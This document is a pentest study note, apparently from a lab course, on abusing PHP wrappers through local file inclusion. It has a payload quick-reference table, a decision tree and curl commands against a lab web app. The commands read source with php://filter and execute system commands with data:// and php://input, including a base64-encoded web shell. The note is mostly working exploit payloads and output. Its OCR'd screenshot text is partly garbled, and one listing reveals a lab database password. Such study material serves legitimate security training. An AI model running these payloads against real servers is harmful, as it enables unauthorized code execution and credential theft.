---
tags:
  - lfi
  - php
  - web
---

# PHP wrappers

> [!tip] Quick Reference — PHP Wrappers
> | Wrapper | Use | Payload |
> |---------|-----|---------|
> | `php://filter` | Read source code | `?page=php://filter/convert.base64-encode/resource=index.php` |
> | `php://input` | Execute POST body | `?page=php://input` + POST: `<?php system('id'); ?>` |
> | `data://` | Inline code exec | `?page=data://text/plain,<?php system('id');?>` |
> | `data://` base64 | Bypass filters | `?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==` |
> | `expect://` | Direct RCE | `?page=expect://id` (rarely enabled) |

## Decision Tree

```
LFI confirmed but no logs accessible?
├── Read source code first (understand the app)
│   └── php://filter/convert.base64-encode/resource=<filename>
│       └── base64 -d to decode the output
│
├── Try data:// for inline execution
│   ├── allow_url_include=On needed
│   ├── ?page=data://text/plain,<?php system($_GET['cmd']);?>
│   └── If filtered → base64 encode the payload
│
├── Try php://input
│   ├── allow_url_include=On needed
│   ├── curl -X POST "http://<IP>/?page=php://input" --data "<?php system('id');?>"
│   └── Works if POST body is executed
│
└── Nothing works?
    └── Fall back to log poisoning or RFI
```

## Resources
- [HackTricks — PHP Wrappers](https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-rfi-using-php-wrappers)
- [PayloadsAllTheThings — PHP Wrappers](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter)


PHP offers a variety of protocol wrappers to enhance the language's capabilities. For example, PHP wrappers can be used to represent and access local or remote filesystems. We can use these wrappers to bypass filters or obtain code execution via File Inclusion vulnerabilities in PHP web applications. While we'll only examine the php://filter and data:// wrappers, many are available.

> [!note]- Screenshot
> ```
> Let's demonstrate this by revisiting the "Mountain Desserts" web
> application. First, we'll provide the admin.php file as a value for
> the "page" parameter, as in the last Learning Unit.
> kaligkali:~§ curl http://mountaindesserts .com/meteor/index.php?
> page=admin. php
> <a href="index.php?page=admin.php"><p style="text-align:cente
> Pp" >Admin</p></a>
> <IDOCTYPE html>
> <html lang="en">
> <head>
> <meta charset="UTF-8">
> <meta name="Viewport” content="width=device-width, initial-
> scale=1.0">
> <title>Maintenance</title>
> </head>
> <body>
> <span style="color: #F00; text-align: center;">The admin p
> age is currently under maintenance.
> Listing 21 - Contents of the admin. php file
> Listing 21 shows the title and maintenance text we already
> encountered while reviewing the web application earlier. We also
> notice that the <body> tag is not closed at the end of the HTML
> code. We can assume that something is missing. PHP code will
> be executed server side and, as such, is not shown. When we
> compare this output with previous inclusions or review the source
> code in the browser, we can conclude that the rest of the
> index.php page's content is missing.
> ```


> [!note]- Screenshot
> ```
> Next, let's include the file, using php://filter to better understand
> this situation. We will not use any encoding on our first attempt.
> The PHP wrapper uses resource as the required parameter to
> specify the file stream for filtering, which is the filename in our
> case. We can also specify absolute or relative paths in this
> parameter.
> kaligkali:~§ curl http://mountaindesserts .com/meteor/index.php?
> page-php://filter/resource-admin. php
> <a href="index.php?page=admin.php"><p style="text-align:cente
> Pp" >Admin</p></a>
> <IDOCTYPE html>
> <html lang="en">
> <head>
> <meta charset="UTF-8">
> <meta name="Viewport” content="width=device-width, initial-
> scale=1.0">
> <title>Maintenance</title>
> </head>
> <body>
> <span style="color: #F00; text-align: center;">The admin p
> age is currently under maintenance.
> Listing 22 - Usage of "php://filter" to include unencoded admin.php
> ```

curl
[http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php](http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php)

> [!note]- Screenshot
> ```
> The output of Listing 22 shows the same result as Listing 21. This
> makes sense since the PHP code is included and executed via
> the LFI vulnerability. Let's now encode the output with base64 by
> adding convert.base64-encode. This converts the specified
> resource to a base64 string.
> kaligkali:~$ curl http://mountaindesserts .com/meteor/index.php?
> page-php: //filter/convert .base64-encode/resource=admin. php
> <a href="index.php?page=admin.php"><p style="text-align:cente
> r">admin</p></a>
> PCFETONUNVBF IGhObiiw+CjxodG1sIGxhbmc9InVulj4KPGh1YWQ+CiAgICASDHV
> @YSBjaGFyc2VEPSIVVEYLOCI+ CiAgICASbHVOYSBUYW11PSI2anV3cG9ydCIgY2
> ‘SudGVudboid21kdGg9ZGV2aWN1LXdpZHRoLCBpbm1@aWF sLXNjYWx1PTEUMCT+C
> iAgICA8dG10bGU+TWFpbn...
> <dF91cnJvcik7Cn@kZHNobyAiQ29ubmVjdGVkIHN1Y2N1c3NmdWxseSI7C58+Cg0
> SL2IVZHk+CjuvaHRtbb4ak
> Listing 23 - Usage of “php://filter” to include base64 encoded admin.php
> ```

curl
[http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php](http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php)

> [!note]- Screenshot
> ```
> Listing 23 shows that we included base64 encoded data, while
> the rest of the page loaded correctly. We can now use the
> base64 program with the -d flag to decode the encoded data in
> the terminal.
> kaligkali:~§ echo “PCFETNUWVBFIGhObWw+CjxodG1sIGxhbmcOImvulj4k
> PGh1YWQ+CiAgICASDWVOYSB jaGFyc2VEPSIVVEYtOCT+CiAgICASbHVOYSBUYHL
> ‘1PS32ahV3cG9ydCTgy29udGVuddeid21kdGg97GV2aNN1LXdpZHRoL CBpbmlealt
> FSLXNjYux1 PTEUMCT+CiAgICA8dG10bGU+ TWF pbnRlbmF uY2U8L3RpdGx1Pgo8L
> 2hLYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJ2xzcGFUIHNGeWx1PSI5
> b2xvcjojRjAwO3RLeHQtYuxpZ246Y2VudGVyOyI+VGhLIGFkbW1uIHBhZ2UgaXM
> gV3VycmVudGxSTHVuZGVy1G1haW5@ZWShbmN1Lic71D8+Cgo8P3BocAokc2vydm
> ‘vybmFtZSA9ICIsb2NhbGhvc3QiOwokdXN1cmShbuUgPSAicm9vdCI7CiRWYXNzd
> 29yZCASTCINMDBuSzRrZUNhcmOhMiMi OWoKLy8gQ3I1YXRLIGNVbmS1Y3Rpb24K
> ‘JGNvbm4 gPSBuZXcgbX1 zchxpKCRZZXI2ZXIUYWLLLCAKAXNI.cmShbHUSICRWYXN
> zd29yZCk7CgovLyBDaGV jayBjb25uZwNOab9uCmlmICgkY29ubi0+¥29ubmVjdF
> Ol cnIvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWl sZWQ6ICTgLiAkY29ubi0+Y
> 29ubmVjdF91cnJvcik7Cn@KZWNobyAiQ29ubmVjdGVkIHNAY2N1.c3NmdhixseSI7
> (Cj8+Cgo8L2IvZHk+CjwvaHRtbb4Kk" | base64 -d
> <IDOCTYPE html>
> <html lang="en">
> <head>
> <meta charset="UTF-8">
> <meta name="Viewport” content="width=device-width, initial-
> scale=1.0">
> <title>Maintenance</title>
> </head>
> <body>
> <2php echo ‘<span style="color:#F00;text-align:cente
> r3">The admin page is currently under maintenance."; ?>
> <?php
> $servername = “localhost”;
> $username = “root”;
> $password = “MeonKakeCard!2#";
> 11 Create connection
> $conn = new mysqli($servername, $username, $password);
> Listing 24 - Decoding the base64 encoded content of admin.php
> ```


> [!note]- Screenshot
> ```
> While the php://filter wrapper can be used to include the
> contents of a file, we can use the data:// wrapper to achieve
> code execution. This wrapper is used to embed data elements as
> plaintext or base64-encoded data in the running web
> application's code. This offers an alternative method when we
> cannot poison a local file with PHP code.
> ```


> [!note]- Screenshot
> ```
> Let's demonstrate how to use the data:// wrapper with the
> “Mountain Desserts" web application. To use the wrapper, we'll
> add data:// followed by the data type and content. In our first
> example, we will try to embed a small URL-encoded PHP snippet
> into the web application's code. We can use the same PHP
> snippet as previously with Is the command.
> 
> kaligkali:~$ curl “http://mountaindesserts.com/meteor/index.ph
> 
> p?page=data: //text/plain, <?php%20echo%20system("1s")5?>"
> 
> <a href="index.php?page=admin.php"><p style="text-align:cente
> 
> Pp" >Admin</p></a>
> 
> admin. php
> 
> bavarian.php
> 
> css
> 
> fonts
> 
> img
> 
> index.php
> 
> is
> 
> Listing 25 - Usage of the “data://" wrapper to execute Is
> 
> Listing 25 shows that our embedded data was successfully
> executed via the File Inclusion vulnerability and data:// wrapper.
> ```

curl "http://mountaindesserts.com/meteor/index.php?

## page=data://text/plain,<?php%20echo%20system('ls');?>"


> [!note]- Screenshot
> ```
> When web application firewalls or other security mechanisms are
> in place, they may filter strings like "system" or other PHP code
> elements. In such a scenario, we can try to use the data://
> wrapper with base64-encoded data. We'll first encode the PHP.
> snippet into base64, then use curl to embed and execute it via
> the data:// wrapper.
> ```


> [!note]- Screenshot
> ```
> kali@kali:~$ echo -n ‘<?php echo system($ GET["cmd"]);?>" | bas
> 
> 64
> 
> PD9waHAgZWNobyBzeXN@ZWG0JFSHRVRbIMNtZCIdKTS /Pg==
> 
> kaligkali:~$ curl “http://mountaindesserts.com/meteor/index.ph
> 
> p?page=data: //text/plain; base64, PD9waHAgZWNobyBzeXNOZW00]FOHRVR
> 
> bImNtZCJdkTs/Pg=-&cmd=15"
> 
> <a href="index.php?page=admin.php"><p style="text-align:cente
> 
> Pp" >Admin</p></a>
> 
> admin. php
> 
> bavarian. php
> 
> css
> 
> fonts
> 
> img
> 
> index.php
> 
> is
> 
> start.sh
> 
> Listing 26 - Usage of the “data://" wrapper with base64 encoded data
> 
> Listing 26 shows that we successfully achieved code execution
> with the base64-encoded PHP snippet. This is a handy technique
> that may help us bypass basic filters. However, we need to be
> aware that the data:// wrapper will not work in a default PHP
> installation. To exploit it, the a/low_urlinclude setting needs to be
> enabled.
> ```

curl "http://mountaindesserts.com/meteor/index.php?page=

## data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"

curl http://192.168.158.16/meteor/index.php?page=php://filter/convert.base64-encode/resource=

## /var/www/html/backup.php

curl "http://192.168.158.16/meteor/index.php?page=

## data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname%20-a"

---
%% graph-links %%
## Related
- [[Local file inclusion (LFI)]]
- [[Remote file inclusion (RFI)]]
- [[Command Injection]]

> [!info] Navigation
> Section: [[Web Applications/Common Web Application Attacks/File Inclusion Vulnerabilities/_index|File Inclusion Vulnerabilities]] · Home: [[🏠 Home]]

